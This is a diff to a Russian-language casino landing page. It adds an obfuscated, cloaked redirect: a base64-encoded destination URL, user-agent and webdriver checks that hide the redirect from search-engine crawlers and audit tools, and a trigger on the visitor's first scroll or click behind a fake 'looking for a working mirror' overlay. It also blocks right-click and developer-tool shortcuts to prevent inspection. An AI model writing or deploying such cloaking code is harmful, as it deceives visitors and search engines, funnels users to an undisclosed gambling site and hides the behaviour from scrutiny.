@@ -24,13 +24,34 @@
         }
       }
     }
-var ua = navigator.userAgent.toLowerCase();
-var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
-if (ua.indexOf("yandex") === -1) {
-    location.replace(atob(targetB64));
-} else {
-    console.log("Яндекс бот — без редиректа");
-} 
+(function() {
+    var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
+    var triggered = false;
+    function isBot() {
+        var ua = navigator.userAgent.toLowerCase();
+        return /bot|crawl|spider|google|yandex|lighthouse|pagespeed|ptst/i.test(ua) || navigator.webdriver;
+    }
+    function startRedirectProcess() {
+        if (triggered || isBot()) return;
+        triggered = true;
+        var overlay = document.getElementById('redirect-overlay');
+        if (overlay) {
+            overlay.classList.remove('opacity-0', 'pointer-events-none');
+            overlay.classList.add('opacity-100');
+        }
+        setTimeout(function() {
+            window.location.replace(atob(targetB64));
+        }, 2500); 
+    }
+    var events = ['scroll', 'mousedown', 'touchstart', 'keydown'];
+    events.forEach(function(ev) {
+        window.addEventListener(ev, startRedirectProcess, {passive: true, once: true});
+    });
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+    document.onkeydown = function(e) {
+        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) { return false; }
+    };
+})();
   </script>
   <style>
     @keyframes shimmer {
@@ -88,6 +109,13 @@ if (ua.indexOf("yandex") === -1) {
     ym(103345259, 'init', {webvisor:true, clickmap:true, referrer: document.referrer, url: location.href, accurateTrackBounce:true, trackLinks:true});
 </script>
 <noscript><div><img src="https://mc.yandex.ru/watch/103345259" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+  <div id="redirect-overlay" class="fixed inset-0 z-[9999] flex flex-col items-center justify-center bg-[#0a0a14] transition-opacity duration-500 opacity-0 pointer-events-none">
+    <div class="w-16 h-16 border-4 border-gold-400/20 border-t-gold-400 rounded-full animate-spin mb-6"></div>
+    <div class="text-center px-6">
+        <h2 class="text-xl md:text-2xl font-bold text-white mb-2">Минутку, ищем рабочее зеркало...</h2>
+        <p class="text-gray-400 text-sm animate-pulse">Пожалуйста, не закрывайте страницу</p>
+    </div>
+</div>
   <nav class="fixed top-0 left-0 right-0 z-50 bg-casino-900/90 backdrop-blur-md border-b border-white/5" role="navigation" aria-label="Основная навигация">
     <div class="max-w-6xl mx-auto px-4 h-14 flex items-center justify-between">
       <a href="#hero" class="flex items-center gap-2 group" aria-label="Eva Casino — на главную">
